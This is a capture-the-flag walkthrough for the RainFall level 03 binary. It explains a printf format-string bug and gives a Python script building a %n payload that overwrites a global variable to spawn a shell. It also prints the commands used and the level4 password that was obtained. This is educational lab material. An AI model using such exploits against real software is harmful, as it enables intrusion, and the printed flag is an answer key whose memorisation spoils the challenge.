# Level 03 Walkthrough

## Binary analysis

The binary is vulnerable to a format string attack. The global variable `m` (address: 0x0804988c) must be set to 0x40 to trigger the call to `system("/bin/sh")`.

Relevant code:
```
080484c7        char buffer[0x208]
080484c7        fgets(buf: &buffer, n: 0x200, fp: stdin)
080484d5        printf(format: &buffer)
080484da        uint32_t m_1 = m
080484e2        if (m_1 != 0x40)
08048519            return m_1
08048507        fwrite(buf: "Wait what?!\n", size: 1, count: 0xc, fp: stdout)
08048513        return system(line: "/bin/sh")
```

## Exploitation

To get the address of the variable `m` we use `objdump` :

```
level3@RainFall:~$ objdump -t ./level3 | grep m
./level3:     file format elf32-i386
080481b8 l    d  .dynsym    00000000              .dynsym
08048618 l    d  .eh_frame_hdr    00000000              .eh_frame_hdr
08048654 l    d  .eh_frame    00000000              .eh_frame
0804974c l    d  .dynamic    00000000              .dynamic
00000000 l    d  .comment    00000000              .comment
08049884 l     O .bss    00000001              completed.6159
08048480 l     F .text    00000000              frame_dummy
08048734 l     O .eh_frame    00000000              __FRAME_END__
0804974c l     O .dynamic    00000000              _DYNAMIC
00000000       F *UND*    00000000              system@@GLIBC_2.0
00000000  w      *UND*    00000000              __gmon_start__
00000000       F *UND*    00000000              __libc_start_main@@GLIBC_2.0
0804988c g     O .bss    00000004              m
0804851a g     F .text    0000000d              main
```

We use a format string payload to write 0x40 into the global variable `m`.

And then we just need the offset to build our payload and exploit `printf()`.

```
level3@RainFall:~$ ./level3 
AAAA.%p.%p.%p.%p.%p.%p.%p.%p
AAAA.0x200.0xb7fd1ac0.0xb7ff37d0.0x41414141.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e
```

Python script to generate the payload:
```python
import struct
m_addr = 0x0804988c
offset = 4
payload = struct.pack("<I", m_addr)
payload += b"%60x"
payload += f"%{offset}$n".encode('ascii')
with open('payload.txt', 'wb') as f:
    f.write(payload)
```

## Commands used

```
cat /tmp/payload.txt - | ./level3
ls
cat /home/user/level4/.pass
```

## Result

After running the exploit, we get a shell as level4 and can read the password:

```
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
